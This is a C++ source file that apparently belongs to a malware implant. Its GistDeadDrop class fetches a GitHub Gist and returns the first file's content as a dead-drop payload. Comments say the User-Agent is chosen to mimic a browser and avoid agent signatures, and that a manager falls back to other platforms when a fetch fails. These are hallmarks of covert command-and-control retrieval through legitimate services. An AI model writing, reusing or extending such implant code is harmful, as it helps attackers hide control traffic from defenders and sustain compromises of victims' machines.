/**
 * @file GistDeadDrop.cpp
 */
#include "Core/Config/UA/UAProvider.hpp"
#include "GistDeadDrop.hpp"

#include "Common/Logger/Logger.hpp"
#include "Common/ThirdParty/json.hpp"

namespace cleat {
namespace deaddrop {

    GistDeadDrop::GistDeadDrop(IHttpOps& http, std::string apiUrl, int timeoutMs)
        : http_(http), apiUrl_(std::move(apiUrl)), timeoutMs_(timeoutMs) {
    }

    std::optional<std::string> GistDeadDrop::FetchRaw() {
        // GitHub REST 强制 UA(缺 = 403); 值用通用浏览器形态(非 Agent 特征)
        const std::vector<std::pair<std::string, std::string>> headers = {
            {"User-Agent", UAProvider::Pick()},
            {"Accept", "application/vnd.github+json"},
        };
        std::vector<uint8_t> resp;
        if (!http_.RoundTrip(HttpMethod::Get, apiUrl_, {}, resp, timeoutMs_, &headers)) {
            return std::nullopt;   // 网络失败/非 200 → Manager 尝试下一平台
        }

        // Gist 响应: {"files": {"<name>": {"content": "..."}}, ...}
        // 取第一个 file 的 content(files 是 map, 遍历顺序即语义顺序 —— 单 file 用法)
        try {
            const nlohmann::json j = nlohmann::json::parse(
                std::string(reinterpret_cast<const char*>(resp.data()), resp.size()));
            const auto itFiles = j.find("files");
            if (itFiles == j.end() || !itFiles->is_object()) return std::nullopt;
            for (auto it = itFiles->begin(); it != itFiles->end(); ++it) {
                if (!it.value().is_object()) continue;
                const auto itContent = it.value().find("content");
                if (itContent != it.value().end() && itContent->is_string()) {
                    return itContent->get<std::string>();
                }
            }
        }
        catch (const std::exception& e) {
            LOG_WARN("GistDeadDrop: JSON 解析失败 " << e.what());
            return std::nullopt;
        }
        return std::nullopt;
    }

} // namespace deaddrop
} // namespace cleat
